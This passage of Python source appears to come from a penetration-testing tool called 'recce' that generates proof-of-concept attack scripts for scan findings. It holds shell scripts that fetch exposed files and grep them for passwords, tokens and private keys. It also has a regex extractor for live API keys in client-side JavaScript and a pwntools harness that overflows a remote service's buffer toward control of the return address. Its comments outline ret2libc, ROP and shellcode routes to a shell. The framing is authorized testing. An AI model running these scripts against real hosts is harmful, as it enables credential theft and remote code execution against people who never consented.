            "PUT a marker file, read it back, then DELETE it")


def _p_download(u):
    return ("sh", "#!/bin/sh\n# recce exposed-file PoC - fetch the file and prove secret exposure (read-only).\n"
            + _ROE + "\n"
            f'U="{u}"\n'
            "b=$(curl -sk \"$U\")\n"
            "echo \"PROVEN: fetched $(printf '%s' \"$b\" | wc -c) byte(s) from $U\"\n"
            "printf '%s' \"$b\" | grep -iE 'password|secret|api[_-]?key|token|aws_access|BEGIN .*PRIVATE KEY' | head -10\n"
            "printf '%s' \"$b\" | head -20\n",
            "fetch the exposed file and show its (secret) contents")


def _p_js_secret(u):
    return ("sh", "#!/bin/sh\n# recce JS-secret PoC - extract the hardcoded key from the client-side script.\n"
            + _ROE + "\n"
            f"keys=$(curl -sk \"{u}\" | grep -oE 'AIza[0-9A-Za-z_-]{{35}}|AKIA[0-9A-Z]{{16}}|sk_live_[0-9A-Za-z]+|"
            "gh[pousr]_[0-9A-Za-z]{36}|-----BEGIN [A-Z ]*PRIVATE KEY-----' | sort -u)\n"
            "if [ -n \"$keys\" ]; then echo 'PROVEN: extracted key(s):'; echo \"$keys\"; else echo 'no key found'; fi\n"
            "# ACTION (ROE): validate the key against its API to confirm it is live.\n",
            "extract the hardcoded key from the JS file")


_WEB_POC = {
    "web-git": _p_git, "web-gitconfig": _p_git,
    "web-cors": _p_cors, "web-jwt": _p_jwt, "web-ssti": _p_ssti,
    "web-graphql": _p_graphql, "web-actuator-heapdump": _p_heapdump,
    "web-methods": _p_methods, "web-js-secret": _p_js_secret,
    "web-dotenv": _p_download, "web-aws": _p_download, "web-htpasswd": _p_download,
    "web-backup": _p_download, "web-actuator-env": _p_download,
    "web-actuator-configprops": _p_download, "web-metrics": _p_download,
    "web-serverstatus": _p_download, "web-serverinfo": _p_download,
    "web-phpinfo": _p_download,
}


def web_pocs_for_host(host) -> list[tuple]:
    """Per-web-finding PoC artifacts for a host: [(filename, content, note)],
    deduped by (script_id, port). Tailored to each finding, URL filled in."""
    out: list[tuple] = []
    seen: set[tuple] = set()
    for v in getattr(host, "vulns", []) or []:
        if getattr(v, "source", "") != "web":
            continue
        builder = _WEB_POC.get(v.script_id)
        if not builder:
            continue
        key = (v.script_id, v.port)
        if key in seen:
            continue
        seen.add(key)
        ext, content, note = builder(_url_from_vuln(v))
        fname = f"poc_{v.script_id}_{host.ip}_{v.port or 0}.{ext}"
        out.append((fname, content, note))
    return out


# Memory-corruption weakness classes — where a CUSTOM PoC (pwntools) is the right
# proof rather than a canned module/tool. Matched on the finding's CWEs, or its
# text as a fallback.
# CONTROL-FLOW memory corruption only — where a crash+control (pwntools) skeleton
# is the right proof. Deliberately EXCLUDES CWE-125 (out-of-bounds READ): a read
# primitive (e.g. Heartbleed) is a memory-disclosure bug, not a control-flow smash,
# and gets its own disclosure PoC instead. Only CWEs in recce's catalogue (a test
# enforces every referenced CWE is named + typed).
_MEMCORR_CWES = {"CWE-119", "CWE-120", "CWE-121", "CWE-190", "CWE-416", "CWE-787"}
_MEMCORR_RX = re.compile(
    r"buffer overflow|stack[- ]based (overflow|buffer)|heap[- ]based (overflow|buffer)|"
    r"memory corruption|use[- ]after[- ]free|out[- ]of[- ]bounds write|integer overflow", re.I)


def _is_memcorr(v) -> bool:
    if set(getattr(v, "cwes", []) or []) & _MEMCORR_CWES:
        return True
    return bool(_MEMCORR_RX.search(f"{getattr(v, 'title', '')} {getattr(v, 'output', '')}"))


def _pwntools_skel(title: str, ip: str, port) -> str:
    """A pwntools PoC HARNESS: finds the crash offset, proves control of the saved
    return address, and lays out the technique decision tree (ret2win / ret2libc /
    ROP / ret2dlresolve) by protection. The operator supplies offset + chain.
    Requires pwntools; not weaponized / not AV-evasive — recce's proof-not-weapon."""
    return (
        "#!/usr/bin/env python3\n"
        f"# recce PoC (pwntools) - {title}  vs {ip}:{port or 0}\n"
        "# Memory-corruption harness. Requires pwntools (pip install pwntools). Proves\n"
        "# crash -> control; you set OFFSET + the final chain and finish within ROE.\n"
        f"{_ROE}\n"
        "from pwn import *\n"
        "context.update(arch='amd64', os='linux', log_level='info')  # adjust arch to target\n"
        f"HOST, PORT = '{ip}', {port or 0}\n"
        "BINARY = ''            # optional: local copy of the target binary\n"
        "if BINARY:\n"
        "    e = context.binary = ELF(BINARY)\n"
        "    log.info('protections: %s', e.checksec())  # NX/PIE/canary/RELRO pick the technique\n"
        "\n"
        "def send(payload):\n"
        "    io = remote(HOST, PORT); io.send(payload); return io\n"
        "\n"
        "def find_offset():\n"
        "    # 1) send a De Bruijn pattern, 2) read the value in the crashed return\n"
        "    #    address (core dump / gdb), 3) OFFSET = cyclic_find(that, n=8).\n"
        "    io = send(cyclic(2048, n=8)); io.close()\n"
        "    log.info('sent cyclic(2048, n=8) - recover the crash value, then cyclic_find(0x..., n=8)')\n"
        "\n"
        "OFFSET   = 0                       # TODO: cyclic_find(<crash value>, n=8)\n"
        "BADCHARS = b'\\x00\\x0a\\x0d'          # TODO: verify the payload survives intact\n"
        "\n"
        "def prove_control():\n"
        "    # PROVE control first: crash with RIP = 0x4242424242424242 (verify in a debugger).\n"
        "    payload  = cyclic(OFFSET, n=8) if OFFSET else b'A' * 512\n"
        "    payload += p64(0x4242424242424242)\n"
        "    io = send(payload); io.interactive()\n"
        "\n"
        "# Next (ROE), by protections:\n"
        "#   NX off            -> jmp to shellcode in the buffer (asm(shellcraft.sh())).\n"
        "#   NX on, no PIE     -> ret2win, or ROP: rop = ROP(e); rop.call('system', [bin_sh]).\n"
        "#   NX on + ASLR/libc -> leak (puts@plt + puts@got) -> libc base -> system('/bin/sh').\n"
        "#   no leak available -> ret2dlresolve (Ret2dlresolvePayload).\n"
        "if __name__ == '__main__':\n"
        "    find_offset()\n"
        "    # prove_control()   # arm once OFFSET is set, within ROE\n")


def pwntools_for_host(host) -> list[tuple]:
    """pwntools PoC skeletons for a host's memory-corruption findings:
    [(filename, content, note)], deduped by (script_id, port)."""
    from ..core import qod
    out: list[tuple] = []
    seen: set = set()
    for v in getattr(host, "vulns", []) or []:
        if not qod.is_visible(v) or not _is_memcorr(v):
            continue
        key = (getattr(v, "script_id", ""), getattr(v, "port", 0))
        if key in seen:
            continue
        seen.add(key)
        title = v.title or v.script_id or "memory-corruption finding"
        out.append((f"poc_pwntools_{host.ip}_{v.port or 0}.py",
                    _pwntools_skel(title, host.ip, v.port or 0),
                    f"pwntools harness — find the crash offset + prove control for {title}"))
    return out


def recipe_key_for(text: str) -> str | None:
    for rx, k in _MATCH_C:
        if rx.search(text or ""):
            return k
    return None


def select_for_host(host) -> dict[str, dict]:
    """The applicable PoC recipes for a host's CONFIRMED findings, keyed by id."""
    keys: list[str] = []
    texts: list[str] = []
    from ..core import qod
    for v in getattr(host, "vulns", []) or []:
        if qod.is_visible(v):          # single QoD authority (was: confidence != potential)
            texts.append(f"{v.title} {v.output}")
    for f in getattr(host, "local_findings", []) or []:
        texts.append(f.get("vector", ""))
    for t in texts:
        k = recipe_key_for(t)
        if k and k not in keys:
            keys.append(k)
    return {k: RECIPES[k] for k in keys}


def write_files(poc_dir: str, recipes: dict, written: set | None = None) -> list[str]:
    """Write each recipe's source files into poc_dir (deduped via `written`).
    Returns the list of file paths written this call."""
    os.makedirs(poc_dir, exist_ok=True)
    written = written if written is not None else set()
    out: list[str] = []
    for r in recipes.values():
        for fname, content in r.get("files", {}).items():
            if fname in written:
                continue
            written.add(fname)
            path = os.path.join(poc_dir, fname)
            with open(path, "w") as fh:
                fh.write(content)
            out.append(path)
    return out


def plan_lines(recipes: dict) -> list[str]:
    """Commented reference block (build -> deliver -> proof) for a host script."""
    if not recipes:
        return []
    lines = [
        "# ======================================================",
        "# PoC BUILD RECIPES (proofs - swap the ACTION for your ROE command)",
        "# Source files are in ./poc/ ; nothing here is obfuscated or AV-evasive.",
        "# ======================================================",
    ]
    for r in recipes.values():
        lines.append(f"#   {r['name']}")
        for f in r.get("files", {}):
            lines.append(f"#     source : poc/{f}")
        for b in r["build"]:
            lines.append(f"#     build  : {b}")
        lines.append(f"#     deliver: {r['deliver']}")
        lines.append(f"#     proof  : {r['proof']}")
        lines.append("#")
    return lines
